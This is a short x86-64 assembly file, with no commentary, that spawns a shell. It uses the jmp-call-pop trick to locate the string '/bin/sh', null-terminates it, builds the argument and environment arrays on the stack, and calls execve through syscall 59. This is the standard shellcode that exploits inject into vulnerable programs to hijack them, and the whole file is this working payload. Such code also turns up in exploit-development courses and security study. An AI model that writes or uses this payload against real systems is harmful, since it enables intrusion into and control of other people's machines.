.section data
.section .text
.global _start
_start:
jmp end

start:
pop %rdi 

xor %rax, %rax 
movb %al, 7(%rdi)

push %rax

mov %rsp, %rdx
push %rdi


mov %rsp, %rsi

movb $59, %al
syscall

end:
call start
.ascii "/bin/sh" 



 




